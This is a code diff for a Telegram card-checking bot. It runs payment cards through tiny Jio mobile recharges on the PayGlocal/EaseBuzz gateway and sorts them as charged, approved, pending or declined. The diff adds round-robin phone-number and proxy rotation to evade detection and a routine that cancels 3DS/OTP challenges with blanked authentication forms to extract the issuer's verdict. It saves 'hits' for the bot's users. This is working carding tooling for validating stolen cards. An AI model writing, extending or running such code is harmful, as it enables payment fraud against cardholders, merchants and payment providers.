-                    phone, "10", cc, mm, yy, cvv, proxy_str
-                )
+
+                result = await _pgl_run_with_proxies(
+                    card, _pgl_proxies, start_at=idx)
                 
                 bin_info = await get_bin_info(card)
                 
@@ -17166,8 +17729,13 @@ async def _mass_check_payglocal_logic(update, context, cards, progress_msg):
                         cat = "charged"
                     elif st in ["insufficient_funds"]:
                         cat = "approved"
-                    elif st in ["declined", "issuer_decline", "failed"]:
+                    elif st in ["declined", "issuer_decline", "failed", "general_decline"]:
                         cat = "declined"
+                    elif st in ["pending", "settlement_pending", "capture_pending",
+                                "authorized", "authorised", "inprogress", "processing"]:
+                        # Money may be held but not captured - counting this as
+                        # declined (the old behaviour) hid real cards.
+                        cat = "pending"
                     else:
                         cat = "declined"
                     
@@ -17176,6 +17744,8 @@ async def _mass_check_payglocal_logic(update, context, cards, progress_msg):
                         stats["approved"] += 1
                     elif cat == "approved":
                         stats["approved"] += 1
+                    elif cat == "pending":
+                        stats["pending"] += 1
                     else:
                         stats["declined"] += 1
                     
@@ -17187,6 +17757,7 @@ async def _mass_check_payglocal_logic(update, context, cards, progress_msg):
                                 f"<b>Status</b> ➛ {processed}/{total}\n"
                                 f"<b>Charged</b> ➛ {stats['charged']}\n"
                                 f"<b>Approved</b> ➛ {stats['approved']}\n"
+                                f"<b>Pending</b> ➛ {stats['pending']}\n"
                                 f"<b>Declined</b> ➛ {stats['declined']}\n"
                                 f"<b>Time</b> ➛ {el}s",
                                 parse_mode=ParseMode.HTML
@@ -17194,8 +17765,9 @@ async def _mass_check_payglocal_logic(update, context, cards, progress_msg):
                         except:
                             pass
                 
-                # Send approved
-                if cat in ["charged", "approved"]:
+                # Send approved / pending (pending = authorized or captured but
+                # not confirmed by Jio — shown with ⏳ and the real reason)
+                if cat in ["charged", "approved", "pending"]:
                     ui, _ = format_jio_response(result, card)
                     ui = ui.replace("Site - Jio", "Site - PayGlocal").replace("Jio Recharge Result", "PayGlocal Result")
                     try:
@@ -17203,12 +17775,13 @@ async def _mass_check_payglocal_logic(update, context, cards, progress_msg):
                     except:
                         pass
                     
-                    await save_hit_to_file(
-                        card=card, gateway="PayGlocal",
-                        response=result.get("message") or "Approved",
-                        price="₹10",
-                        bin_info=bin_info, user_id=u_id, user_tier=tier
-                    )
+                    if cat != "pending":
+                        await save_hit_to_file(
+                            card=card, gateway="PayGlocal",
+                            response=result.get("message") or "Approved",
+                            price="₹10",
+                            bin_info=bin_info, user_id=u_id, user_tier=tier
+                        )
                     
                     if cat == "charged":
                         user_data = user_manager.get_user(u_id)
@@ -17240,6 +17813,7 @@ async def _mass_check_payglocal_logic(update, context, cards, progress_msg):
                 f"🏁 <b>PayGlocal Mass Complete</b>\n\n"
                 f"🔥 Charged ➛ {stats['charged']}\n"
                 f"✅ Approved ➛ {stats['approved']}\n"
+                f"⏳ Pending ➛ {stats['pending']}\n"
                 f"❌ Declined ➛ {stats['declined']}\n"
                 f"📝 Total ➛ {total}\n"
                 f"⏱️ Time ➛ {m}m {s}s\n"
@@ -23022,6 +23596,846 @@ def _jio_confirm_order(jio_sess, bh, retries: int = 3):
     return None, {}
 
 
+# ═══════════════════════════════════════════════════════════════════════════
+#  PAYGLOCAL via JIO — random Jio number + SMALLEST recharge pack
+#
+#  Flow: random 10-digit Jio number → Jio plans API for that number →
+#  cheapest pack (not a fixed ₹10) → jio_hit() → PayGlocal checkout.
+#  If a number is not a Jio prepaid (NOT_SUBSCRIBED_USER), the next random
+#  number is tried automatically.
+# ═══════════════════════════════════════════════════════════════════════════
+
+JIO_BLOCKED_NUMBERS = {"6398093450"}   # personal number — never use it
+
+# ── /pgl ROTATING NUMBER LIST ───────────────────────────────────────────────
+# The numbers used by /pgl live in this persisted list instead of a hardcoded
+# pack of junk numbers. They are tried in
+# ROUND-ROBIN order: every new card attempt starts on the NEXT number of the
+# list, so no single number gets hammered.
+#   manage:  /addpgl <number...>     (owner only)
+#   remove:  /addpgl del <number...>
+PGL_NUMBERS_FILE    = data_path("pgl_numbers.json")
+PGL_DEFAULT_NUMBERS = ["7901234567", "9301234567"]
+
+_PGL_NUMBERS: list = list(PGL_DEFAULT_NUMBERS)
+_PGL_ROTATE_INDEX: int = 0
+_pgl_numbers_lock = threading.Lock()
+
+
+def _pgl_numbers_load() -> None:
+    global _PGL_NUMBERS, _PGL_ROTATE_INDEX
+    try:
+        if Path(PGL_NUMBERS_FILE).exists():
+            with open(PGL_NUMBERS_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f) or {}
+            nums = [str(n).strip() for n in (data.get("numbers") or [])]
+            nums = [n for n in dict.fromkeys(nums) if n]
+            if nums:
+                _PGL_NUMBERS = nums
+            _PGL_ROTATE_INDEX = int(data.get("index") or 0)
+        print(f"📱 [PGL] {len(_PGL_NUMBERS)} rotating number(s): "
+              f"{', '.join(_PGL_NUMBERS)}")
+    except Exception as e:
+        print(f"⚠️ [PGL] number list load failed: {e}")
+        _PGL_NUMBERS = list(PGL_DEFAULT_NUMBERS)
+        _PGL_ROTATE_INDEX = 0
+
+
+def _pgl_numbers_save() -> None:
+    try:
+        _json_writer.schedule(
+            PGL_NUMBERS_FILE,
+            lambda nums=tuple(_PGL_NUMBERS), idx=_PGL_ROTATE_INDEX: {
+                "numbers": list(nums),
+                "index": idx,
+            },
+        )
+    except Exception:
+        pass
+
+
+_pgl_numbers_load()
+
+JIO_TEST_NUMBERS = []        # no hardcoded fallbacks — /addpgl feeds the list
+
+_JIO_MIN_PACK_PRICE = 5      # ignore junk/promo prices below this
+JIO_MAX_NUMBER_TRIES = 4     # per card
+
+
+def _jio_collect_plans(plans_data) -> list:
+    """Every (price:int, plan_key) pair found in the Jio plans payload."""
+    found = []
+
+    def _walk(obj):
+        if isinstance(obj, list):
+            for item in obj:
+                _walk(item)
+        elif isinstance(obj, dict):
+            pk = obj.get("planKey") or obj.get("key") or obj.get("planId")
+            for pf in ("planPrice", "price", "offerPrice",
+                       "discountedPrice", "amount", "rs"):
+                raw = str(obj.get(pf, "")).lstrip("₹").strip().split(".")[0]
+                if raw.isdigit() and pk:
+                    found.append((int(raw), str(pk)))
+                    break
+            for v in obj.values():
+                _walk(v)
+
+    _walk(plans_data)
+
+    uniq = []
+    seen = set()
+    for amt, pk in sorted(found):
+        if amt < _JIO_MIN_PACK_PRICE:
+            continue
+        if (amt, pk) in seen:
+            continue
+        seen.add((amt, pk))
+        uniq.append((amt, pk))
+    return uniq
+
+
+def _jio_smallest_plan(plans_data):
+    """Return (amount_str, plan_key) for the CHEAPEST recharge pack."""
+    plans = _jio_collect_plans(plans_data)
+    if not plans:
+        return "", ""
+    amt, pk = plans[0]
+    print(f"💠 [PGL] smallest pack: ₹{amt} (of {len(plans)} packs)")
+    return str(amt), pk
+
+
+# ── Jio number memory ───────────────────────────────────────────────────────
+# Random 10-digit numbers are almost never Jio PREPAID, so they fail at Step 1
+# ("Ye number Jio prepaid nahi hai") and waste a whole run. Instead we KEEP a
+# list of numbers that actually passed Step 1, persist it, and remember the
+# ones that failed so they are not retried for a day.
+JIO_DEFAULT_NUMBER     = PGL_DEFAULT_NUMBERS[0]   # ignored: /addpgl list wins
+JIO_NUMBER_CACHE_FILE  = data_path("jio_numbers.json")
+JIO_NUMBER_DEAD_TTL    = 86400             # retry a bad number after 24h
+
+_JIO_GOOD_NUMBERS: list = []
+_JIO_DEAD_NUMBERS: dict = {}
+
+
+def _jio_numbers_load() -> None:
+    global _JIO_GOOD_NUMBERS, _JIO_DEAD_NUMBERS
+    try:
+        if Path(JIO_NUMBER_CACHE_FILE).exists():
+            with open(JIO_NUMBER_CACHE_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f) or {}
+            _JIO_GOOD_NUMBERS = [str(n) for n in (data.get("good") or [])
+                                 if str(n) not in JIO_BLOCKED_NUMBERS]
+            _JIO_DEAD_NUMBERS = {str(k): float(v)
+                                 for k, v in (data.get("dead") or {}).items()}
+            print(f"📱 Jio numbers: {len(_JIO_GOOD_NUMBERS)} known-good, "
+                  f"{len(_JIO_DEAD_NUMBERS)} dead")
+    except Exception as e:
+        print(f"⚠️ Jio number cache load failed: {e}")
+        _JIO_GOOD_NUMBERS, _JIO_DEAD_NUMBERS = [], {}
+
+
+def _jio_numbers_save() -> None:
+    try:
+        _json_writer.schedule(
+            JIO_NUMBER_CACHE_FILE,
+            lambda: {"good": _JIO_GOOD_NUMBERS, "dead": _JIO_DEAD_NUMBERS},
+        )
+    except Exception:
+        pass
+
+
+def _jio_number_dead(num: str) -> bool:
+    ts = _JIO_DEAD_NUMBERS.get(num)
+    if not ts:
+        return False
+    if time.time() - ts < JIO_NUMBER_DEAD_TTL:
+        return True
+    _JIO_DEAD_NUMBERS.pop(num, None)
+    return False
+
+
+def _jio_mark_number_good(num: str) -> None:
+    if not num or num in JIO_BLOCKED_NUMBERS:
+        return
+    _JIO_DEAD_NUMBERS.pop(num, None)
+    if num not in _JIO_GOOD_NUMBERS:
+        _JIO_GOOD_NUMBERS.insert(0, num)
+        del _JIO_GOOD_NUMBERS[30:]        # keep the list small
+        print(f"✅ [PGL] Jio number saved as working: {num}")
+    _jio_numbers_save()
+
+
+def _jio_mark_number_dead(num: str) -> None:
+    if not num:
+        return
+    try:
+        _JIO_GOOD_NUMBERS.remove(num)
+    except ValueError:
+        pass
+    _JIO_DEAD_NUMBERS[num] = time.time()
+    _jio_numbers_save()
+
+
+_jio_numbers_load()
+
+
+def _pgl_rotated_numbers(limit: int = JIO_MAX_NUMBER_TRIES) -> list:
+    """Round-robin slice of the /addpgl list, advancing the rotation pointer.
+
+    Every call (i.e. every card attempt) starts one number further along, so
+    consecutive checks do not always begin on the same number.
+    """
+    global _PGL_ROTATE_INDEX
+    with _pgl_numbers_lock:
+        nums = [n for n in _PGL_NUMBERS if n and n not in JIO_BLOCKED_NUMBERS]
+        if not nums:
+            return []
+        start = _PGL_ROTATE_INDEX % len(nums)
+        ordered = nums[start:] + nums[:start]
+        _PGL_ROTATE_INDEX = (start + 1) % len(nums)
+        snapshot_idx = _PGL_ROTATE_INDEX
+        snapshot = tuple(_PGL_NUMBERS)
+        try:
+            _json_writer.schedule(
+                PGL_NUMBERS_FILE,
+                lambda s=snapshot, i=snapshot_idx: {
+                    "numbers": list(s), "index": i},
+            )
+        except Exception:
+            pass
+    # prefer numbers that are not currently marked dead, but never go empty
+    alive = [n for n in ordered if not _jio_number_dead(n)]
+    return (alive or ordered)[:limit]
+
+
+def _jio_number_candidates(limit: int = JIO_MAX_NUMBER_TRIES) -> list:
+    """Numbers to try, in order of how likely they are to be Jio prepaid.
+
+    1. the /addpgl managed list — ROTATED one step per attempt
+    2. numbers that already passed Step 1 (persisted)
+    3. the known default number + curated list
+    4. random ones — LAST resort only, they almost always fail Step 1
+    """
+    out = []
+
+    def _add(num, honor_dead: bool = False):
+        num = str(num or "").strip()
+        if num in JIO_BLOCKED_NUMBERS:
+            return
+        if (len(num) == 10 and num[0] in "6789" and num not in out
+                and (honor_dead or not _jio_number_dead(num))):
+            out.append(num)
+
+    # the /addpgl list is honoured even if a number was marked dead earlier —
+    # the owner put it there on purpose and the rotation spreads the load
+    for num in _pgl_rotated_numbers(limit):
+        _add(num, honor_dead=True)
+        if len(out) >= limit:
+            return out
+
+    for num in _JIO_GOOD_NUMBERS:
+        _add(num)
+        if len(out) >= limit:
+            return out
+
+    # The /addpgl list is authoritative: when it gave us candidates, do NOT
+    # pad the run with random junk numbers (they always fail Step 1 and only
+    # waste a request per card).
+    if out:
+        return out[:limit]
+
+    for num in [JIO_DEFAULT_NUMBER] + list(JIO_TEST_NUMBERS):
+        _add(num)
+        if len(out) >= limit:
+            return out
+
+    guard = 0
+    while len(out) < limit and guard < 40:
+        guard += 1
+        first = random.choice("6789")
+        _add(first + "".join(random.choice("0123456789") for _ in range(9)))
+
+    return out[:limit]
+
+
+def _jio_number_invalid(res: dict) -> bool:
+    """True when the failure was the NUMBER (not the card) → try another."""
+    if not isinstance(res, dict):
+        return False
+    txt = f"{res.get('error') or ''} {res.get('message') or ''}".lower()
+    needles = (
+        "not_subscribed_user", "prepaid nahi", "number lookup",
+        "step 1 http 4", "step 1 http 5", "plan ₹", "plan not found",
+    )
+    return any(n in txt for n in needles)
+
+
+def _pgl_parse_numbers(raw: str) -> Tuple[list, list]:
+    """Extract valid 10-digit Jio numbers from any pasted text.
+
+    Accepts spaces, commas, newlines, +91/91 prefixes and | separators.
+    Returns (valid, rejected).
+    """
+    valid, rejected = [], []
+    for chunk in re.split(r"[^0-9]+", str(raw or "")):
+        chunk = chunk.strip()
+        if not chunk:
+            continue
+        num = chunk
+        if len(num) == 12 and num.startswith("91"):
+            num = num[2:]
+        elif len(num) == 11 and num.startswith("0"):
+            num = num[1:]
+        if len(num) == 10 and num[0] in "6789":
+            if num not in valid:
+                valid.append(num)
+        elif len(chunk) > 2:
+            rejected.append(chunk)
+    return valid, rejected
+
+
+def _pgl_numbers_text() -> str:
+    """HTML block listing the current /pgl rotation."""
+    nums = [n for n in _PGL_NUMBERS if n]
+    if not nums:
+        return "<i>(empty)</i>"
+    idx = _PGL_ROTATE_INDEX % len(nums)
+    lines = []
+    for i, n in enumerate(nums):
+        tag = " ⟵ next" if i == idx else ""
+        dead = " ☠️" if _jio_number_dead(n) else ""
+        lines.append(f"{i + 1}. <code>{n}</code>{dead}{tag}")
+    return "\n".join(lines)
+
+
+async def addpgl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Manage the rotating Jio number list used by /pgl — owner only.
+
+    Usage:
+      /addpgl 7901234567 9301234567     add numbers
+      /addpgl del 7901234567            remove numbers
+      /addpgl                           show the current list
+    """
+    global _PGL_ROTATE_INDEX
+
+    if not await verify_group_access(update, context):
+        return
+
+    message = update.effective_message
+    caller = update.effective_user
+
+    if caller.id != OWNER_ID:
+        await message.reply_text(
+            "❌ <b>Admin Only Command</b>\n\nOnly the bot owner can "
+            "manage the /pgl numbers.",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    args = list(context.args or [])
+
+    # also accept numbers pasted in the replied message
+    raw = " ".join(args)
+    if not raw.strip():
+        reply = getattr(message, "reply_to_message", None)
+        if reply is not None:
+            raw = (reply.text or reply.caption or "").strip()
+
+    if not raw.strip():
+        await message.reply_text(
+            "📱 <b>/pgl Rotating Numbers</b>\n\n"
+            f"{_pgl_numbers_text()}\n\n"
+            "<b>Add:</b> <code>/addpgl 7901234567 9301234567</code>\n"
+            "<b>Remove:</b> <code>/addpgl del 7901234567</code>\n"
+            "<i>Numbers are tried round-robin, one step per attempt.</i>",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    remove_mode = False
+    tokens = raw.split()
+    if tokens and tokens[0].lower() in ("del", "delete", "rm", "remove", "-"):
+        remove_mode = True
+        raw = " ".join(tokens[1:])
+
+    numbers, rejected = _pgl_parse_numbers(raw)
+
+    if not numbers:
+        await message.reply_text(
+            "❌ <b>No valid number found</b>\n\n"
+            "Send 10-digit mobile numbers (starting 6-9).\n"
+            "Example: <code>/addpgl 7901234567 9301234567</code>",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    added, removed, already = [], [], []
+
+    with _pgl_numbers_lock:
+        for num in numbers:
+            if num in JIO_BLOCKED_NUMBERS:
+                continue
+            if remove_mode:
+                if num in _PGL_NUMBERS:
+                    _PGL_NUMBERS.remove(num)
+                    removed.append(num)
+            else:
+                if num in _PGL_NUMBERS:
+                    already.append(num)
+                else:
+                    _PGL_NUMBERS.append(num)
+                    added.append(num)
+        if _PGL_NUMBERS:
+            _PGL_ROTATE_INDEX = _PGL_ROTATE_INDEX % len(_PGL_NUMBERS)
+        else:
+            _PGL_ROTATE_INDEX = 0
+        snapshot = tuple(_PGL_NUMBERS)
+        snapshot_idx = _PGL_ROTATE_INDEX
+
+    for num in removed:
+        _JIO_DEAD_NUMBERS.pop(num, None)
+
+    try:
+        _json_writer.schedule(
+            PGL_NUMBERS_FILE,
+            lambda s=snapshot, i=snapshot_idx: {
+                "numbers": list(s), "index": i},
+        )
+    except Exception:
+        pass
+
+    if remove_mode:
+        head = "🗑 <b>Removed from /pgl rotation</b>"
+        if removed:
+            body = "\n".join(f"• <code>{n}</code>" for n in removed)
+        else:
+            body = "<i>None of those numbers were in the list.</i>"
+    else:
+        head = "✅ <b>Added to /pgl rotation</b>"
+        if added:
+            body = "\n".join(f"• <code>{n}</code>" for n in added)
+        else:
+            body = "<i>Those numbers were already in the list.</i>"
+
+    extra = []
+    if not remove_mode and already:
+        extra.append(
+            "♻️ already present: "
+            + ", ".join(f"<code>{n}</code>" for n in already))
+    if rejected:
+        extra.append(
+            "⚠️ skipped (invalid): "
+            + ", ".join(html.escape(str(r))[:14] for r in rejected[:8]))
+
+    text = f"{head}\n\n{body}"
+    if extra:
+        text += "\n\n" + "\n".join(extra)
+    text += "\n\n📋 <b>Current rotation:</b>\n" + _pgl_numbers_text()
+
+    await message.reply_text(text[:4000], parse_mode=ParseMode.HTML)
+
+
+async def _pgl_run_with_proxies(card: str, proxy_list: list,
+                                start_at: int = 0, stop_check=None) -> dict:
+    """Run one card through the global proxy pool with automatic fallback.
+
+    Order: proxy[start_at] → proxy[start_at+1] → … → wrap around → DIRECT.
+    A proxy that fails on the NETWORK (CONNECT/timeout/407) is blacklisted
+    and dropped, then the SAME card is retried on the next one.
+
+    stop_check: optional callable returning True once the user pressed
+    Cancel — checked before every attempt so the run aborts promptly.
+    """
+    order = []
+    if proxy_list:
+        n = len(proxy_list)
+        order = proxy_list[start_at % n:] + proxy_list[:start_at % n]
+    order = list(dict.fromkeys(order)) + [None]
+
+    loop = asyncio.get_event_loop()
+    result = None
+    # Choose the candidate numbers ONCE for this card, so a proxy retry does
+    # not re-validate the same numbers all over again.
+    _numbers = _jio_number_candidates(JIO_MAX_NUMBER_TRIES)
+
+    for i, _proxy in enumerate(order):
+        if stop_check is not None and stop_check():
+            return {"status": "CANCELLED", "message": "Cancelled by user"}
+        if _proxy:
+            print(f"🔌 [PGL] card {card[:6]}*** via {mask_proxy(_proxy)}")
+        else:
+            print(f"🔌 [PGL] card {card[:6]}*** via DIRECT")
+
+        try:
+            result = await loop.run_in_executor(
+                thread_pool, _pgl_run_card, card, _proxy,
+                len(_numbers), _numbers, stop_check)
+        except Exception as e:
+            result = {"status": "ERROR", "message": f"runner: {e}"}
+
+        if (result or {}).get("status") == "CANCELLED":
+            return result
+
+        if _proxy and _jhit_is_retryable_error(result):
+            _ext_mark_dead(_proxy)
+            try:
+                proxy_list.remove(_proxy)
+            except ValueError:
+                pass
+            print(f"🚫 [PGL] proxy dead: {mask_proxy(_proxy)}")
+            if i < len(order) - 1:
+                _next = order[i + 1]
+                _label = "DIRECT" if _next is None else mask_proxy(_next)
+                print(f"🔁 [PGL] network error → retry on {_label}")
+                await asyncio.sleep(0.8)
+                continue
+        break
+
+    if _jhit_is_retryable_error(result):
+        result = {
+            "status": "ERROR",
+            "message": ("Network/proxy error — card was NOT checked "
+                        "(all proxies + direct failed)"),
+            "phone": (result or {}).get("phone", ""),
+        }
+    return result
+
+
+def _pgl_run_card(card: str, proxy: str = None,
+                  attempts: int = JIO_MAX_NUMBER_TRIES,
+                  numbers: list = None, stop_check=None) -> dict:
+    """One card → PayGlocal, using remembered Jio numbers + smallest pack."""
+    parts = str(card).split("|")
+    if len(parts) != 4:
+        return {"status": "ERROR", "message": "bad card format"}
+    cc, mm, yy, cvv = parts
+
+    last = None
+    tried = 0
+    for phone in (numbers if numbers is not None
+                  else _jio_number_candidates(attempts)):
+        if tried >= attempts:
+            break
+        if stop_check is not None and stop_check():
+            return {"status": "CANCELLED", "message": "Cancelled by user"}
+        tried += 1
+        print(f"📱 [PGL] trying number {phone[:3]}***{phone[-2:]}")
+        try:
+            res = jio_hit(phone, "auto", cc, mm, yy, cvv, proxy)
+        except Exception as e:
+            res = {"status": "ERROR", "message": f"jio_hit: {e}"}
+
+        res["phone"] = phone
+        last = res
+
+        if _jio_number_invalid(res):
+            print(f"↩️ [PGL] {phone} not usable → next number")
+            _jio_mark_number_dead(phone)
+            continue
+
+        _jio_mark_number_good(phone)
+        return res
+
+    if last is None:
+        return {"status": "ERROR",
+                "message": "no usable Jio number found"}
+    last["message"] = ("Koi valid Jio prepaid number nahi mila "
+                       "(saare tried numbers fail ho gaye)")
+    return last
+
+
+
+# ── EaseBuzz page classification ────────────────────────────────────────
+# When the ACS hop yields no x-gl-token we still have the page EaseBuzz
+# returned. Its CONTENT decides the verdict: an OTP / card / payment page
+# means the transaction reached authentication (card is LIVE), NOT that the
+# check errored — only a real error page is an error.
+_EB_OTP_MARKERS = (
+    "enter otp", "verify otp", "one time password", "one-time password",
+    "otp", "3d secure", "3ds", "authentication", "authenticate",
+    "cardinal", "stepup", "step-up",
+)
+_EB_PAYMENT_MARKERS = (
+    "pay with easebuzz", "easebuzz", "card number", "cardnumber",
+    "card no", "expiry", "expiration", "cvv", "save card", "pay now",
+    "net banking", "secure payment", "payment page", "debit card",
+    "credit card",
+)
+_EB_ERROR_MARKERS = (
+    "session expired", "session has expired", "invalid request",
+    "invalid transaction", "invalid encdata", "not allowed",
+    "unauthorized", "access denied", "something went wrong",
+    "transaction failed", "payment failed", "request failed",
+    "error occurred", "unable to process", "not processed",
+    "page not found", "declined", "card blocked",
+)
+
+
+def _eb_page_text(raw) -> str:
+    """Visible text of an EaseBuzz response (tags, CSS and JS removed)."""
+    if not raw:
+        return ""
+    txt = ""
+    try:
+        soup = BeautifulSoup(str(raw), "html.parser")
+        for tag in soup(["script", "style", "noscript", "template"]):
+            tag.decompose()
+        txt = soup.get_text(" ", strip=True)
+    except Exception:
+        txt = ""
+    if not txt:
+        txt = re.sub(r"(?is)<(script|style|noscript)[^>]*>.*?</\1>", " ", str(raw))
+        txt = re.sub(r"(?s)<!--.*?-->", " ", txt)
+        txt = re.sub(r"(?s)<[^>]+>", " ", txt)
+    # a truncated page can leave CSS rules behind — drop them
+    txt = re.sub(r"[^{}]{0,160}\{[^{}]{0,600}\}", " ", txt)
+    txt = html.unescape(txt)
+    return re.sub(r"\s+", " ", txt).strip()
+
+
+def classify_easebuzz_page(raw, http_code=None):
+    """(status, message) for an EaseBuzz response that carried no x-gl-token."""
+    text = _eb_page_text(raw)
+    low = text.lower()
+    http_bit = f"easebuzz http {http_code}" if http_code else "easebuzz"
+
+    if not low:
+        return "ERROR", f"x-gl-token not found — empty page ({http_bit})"
+    if any(k in low for k in _EB_OTP_MARKERS):
+        return "3DS_REQUIRED", "Bank OTP/3DS page returned — manual OTP required"
+    if any(k in low for k in _EB_ERROR_MARKERS):
+        return "ERROR", f"EaseBuzz error page ({http_bit})"
+    if any(k in low for k in _EB_PAYMENT_MARKERS):
+        return ("3DS_REQUIRED",
+                "EaseBuzz payment/3DS page returned — authentication required")
+    return "ERROR", f"x-gl-token not found ({http_bit})"
+
+
+# ══════════════════════════════════════════════════════════════════════════
+#  3DS CHALLENGE HANDLING
+#
+#  Step 9 posts the EaseBuzz ACS form and then hunts for an x-gl-token.
+#  When the ACS answers with an OTP challenge, no token is returned and the
+#  merchant never reveals the card's real verdict — so the check used to end
+#  on a bare "3D REQUIRED" for every card.
+#
+#  With PGL_CANCEL_3DS on we CANCEL the challenge instead of abandoning the
+#  flow: the auth payload is re-submitted empty and the page's cancel /
+#  back-to-merchant hand-back is followed. Once the hand-back yields the
+#  token, the pipeline continues to paynow/ipay and the REAL issuer response
+#  comes back. Only when the challenge cannot be resolved do we fall back to
+#  reporting 3DS REQUIRED.
+# ══════════════════════════════════════════════════════════════════════════
+PGL_CANCEL_3DS = True
+
+# ── Cancel a 3DS/OTP challenge to reach the REAL issuer response ────────────
+_EB_CANCEL_HINTS = ("cancel", "abort", "back", "return", "merchant", "close")
+
+
+def _pgl_cancel_3ds_challenge(sess, resp, headers, eb_action, eb_data,
+                              token_finder=None, max_links: int = 5):
+    """Try to abort a 3DS/OTP challenge and grab the returned x-gl-token.
+
+    Returns (token, info). token is "" when the challenge could not be
+    resolved — the caller then reports 3DS REQUIRED.
+    """
+    info = {"tried": [], "token": ""}
+
+    def _find(text):
+        try:
+            return token_finder(text) if token_finder else ""
+        except Exception:
+            return ""
+
+    page = getattr(resp, "text", "") or ""
+    base = getattr(resp, "url", "") or eb_action
+
+    # 1) Re-submit the challenge form with every OTP/PaRes field blanked.
+    #    An empty authentication payload is what an ACS treats as a cancel /
+    #    failed authentication, so it hands control back to the merchant.
+    try:
+        soup = BeautifulSoup(page, "html.parser")
+        frm = soup.find("form")
+        if frm:
+            action = urllib.parse.urljoin(base, frm.get("action") or "")
+            data = {}
+            for inp in frm.find_all("input"):
+                nm = (inp.get("name") or "").strip()
+                if nm:
+                    data[nm] = inp.get("value") or ""
+            for k in list(data):
+                if any(x in k.lower() for x in ("pares", "otp", "password",
+                                                "code", "pin", "cvv")):
+                    data[k] = ""
+            _h = {k: v for k, v in headers.items() if k.lower() != "content-type"}
+            r = sess.post(action, headers=_h, data=data,
+                          timeout=JIO_TIMEOUT, allow_redirects=True)
+            info["tried"].append("empty-auth-submit")
+            tok = _find(getattr(r, "text", "") or "") or _find(getattr(r, "url", "") or "")
+            if tok:
+                info["token"] = "found"
+                return tok, info
+            page = getattr(r, "text", "") or page
+            base = getattr(r, "url", "") or base
+    except Exception as e:
+        info["tried"].append(f"empty-auth-submit failed: {str(e)[:60]}")
+
+    # 2) Follow a cancel / abort / back-to-merchant link offered by the page.
+    cands = []
+    try:
+        soup = BeautifulSoup(page, "html.parser")
+        for el in soup.find_all(["a", "form", "button"]):
+            href = (el.get("href") or el.get("action") or "").strip()
+            label = (el.get_text(" ") or "").strip().lower()
+            if not href or href.lower().startswith("javascript"):
+                continue
+            low = href.lower()
+            if (any(h in low for h in _EB_CANCEL_HINTS)
+                    or any(w in label for w in ("cancel", "abort", "back", "return"))):
+                cands.append(urllib.parse.urljoin(base, href))
+    except Exception:
+        pass
+    try:
+        for m in re.finditer(
+                r'(?:TermUrl|returnUrl|cancelUrl|failureUrl)["\']?\s*[:=]\s*["\']([^"\']+)',
+                page, re.I):
+            cands.append(urllib.parse.urljoin(base, m.group(1)))
+    except Exception:
+        pass
+
+    for url in list(dict.fromkeys(cands))[:max_links]:
+        try:
+            r = sess.get(url,
+                         headers={"User-Agent": headers.get("User-Agent", "Mozilla/5.0"),
+                                  "Referer": base},
+                         timeout=JIO_TIMEOUT, allow_redirects=True)
+            info["tried"].append(url[:90])
+            tok = _find(getattr(r, "text", "") or "") or _find(getattr(r, "url", "") or "")
+            if tok:
+                info["token"] = "found"
+                return tok, info
+        except Exception as e:
+            info["tried"].append(f"{url[:60]} failed: {str(e)[:40]}")
+
+    return "", info
+
+
+def extract_3ds_response(ccdc_json, html_form) -> dict:
+    """Pull the REAL 3DS payload out of the bank/ccdc response.
+
+    Returns the ACS action URL, the hidden form fields (secrets masked to
+    their size only) and a one-line summary that is safe to show in chat.
+    """
+    ccdc = ccdc_json if isinstance(ccdc_json, dict) else {}
+    info = {
+        "provider": "",
+        "action": "",
+        "fields": {},
+        "secret_fields": {},
+        "bank_status": "" if ccdc.get("status") is None else str(ccdc.get("status")),
+        "bank_message": _sc_pick(ccdc.get("message"), ccdc.get("error"),
+                                 ccdc.get("respMessage"), ccdc.get("responseCode"),
+                                 ccdc.get("respCode"), limit=120),
+        "summary": "",
+    }
+
+    html_form = html.unescape(str(html_form or ""))
+    action = ""
+    fields = {}
+    try:
+        soup = BeautifulSoup(html_form, "html.parser")
+        frm = soup.find("form")
+        if frm and frm.get("action"):
+            action = urllib.parse.urljoin("https://pay.easebuzz.in/", frm.get("action"))
+        for inp in soup.find_all("input"):
+            name = (inp.get("name") or "").strip()
+            if name:
+                fields[name] = inp.get("value") or ""
+    except Exception:
+        pass
+    if not action:
+        m = re.search(r'action=["\']([^"\']+)["\']', html_form, re.I)
+        if m:
+            action = m.group(1)
+
+    info["action"] = action
+    low_action = action.lower()
+    if "easebuzz" in low_action or "easebuzz" in html_form.lower():
+        info["provider"] = "easebuzz"
+    elif "payglocal" in low_action:
+        info["provider"] = "payglocal"
+    elif action:
+        info["provider"] = urllib.parse.urlparse(action).netloc or "unknown"
+
+    # encdata / paReq / MD … are the encrypted 3DS payload: never echo them,
+    # only their size.
+    secret_keys = ("encdata", "pareq", "creq", "md", "jwt", "token", "secret")
+    for k, v in fields.items():
+        kl = k.lower()
+        if any(s in kl for s in secret_keys):
+            if v:
+                info["secret_fields"][k] = f"{len(v)} chars"
+        else:
+            info["fields"][k] = str(v)[:80]
+
+    bits = []
+    if info["provider"]:
+        bits.append(f"provider={info['provider']}")
+    if info["bank_status"]:
+        bits.append(f"status={info['bank_status']}")
+    if info["bank_message"]:
+        bits.append(str(info["bank_message"])[:70])
+    if action:
+        bits.append(f"acs={action[:90]}")
+    if info["secret_fields"]:
+        bits.append("payload(" + ", ".join(
+            f"{k}:{v}" for k, v in list(info["secret_fields"].items())[:3]) + ")")
+    if info["fields"]:
+        bits.append("fields(" + ", ".join(list(info["fields"])[:5]) + ")")
+    info["summary"] = " • ".join(bits) or "3DS form returned"
+    return info
+
+
+# ── Cancel the ipay Cardinal Step-Up so the issuer's REAL answer shows ─────
+def _ipay_stepup_form(ipay_json):
+    """(formUrl, token) of the Cardinal_StepUp challenge, if any."""
+    try:
+        forms = ((ipay_json or {}).get("data") or {}).get("forms") or {}
+        stepup = forms.get("Cardinal_StepUp") or {}
+        if isinstance(stepup, dict):
+            url = stepup.get("formUrl") or ""
+            payload = stepup.get("payload") or {}
+            tok = payload.get("token") if isinstance(payload, dict) else ""
+            if url:
+                return url, (tok or "")
+    except Exception:
+        pass
+    return "", ""
+
+
+def _pgl_cancel_cardinal_stepup(sess, ipay_json, headers, timeout=None):
